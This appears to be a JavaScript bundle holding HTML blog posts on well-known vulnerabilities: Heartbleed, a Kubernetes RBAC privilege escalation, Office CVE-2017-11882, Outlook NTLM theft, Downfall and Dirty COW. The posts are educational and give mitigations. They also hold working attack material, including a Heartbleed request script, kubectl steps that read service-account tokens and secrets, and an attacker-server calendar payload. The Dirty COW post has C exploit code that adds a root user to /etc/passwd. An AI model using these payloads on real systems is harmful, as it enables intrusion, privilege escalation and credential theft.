def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Ug=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Hg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Vg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Wg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,$g=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Gg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
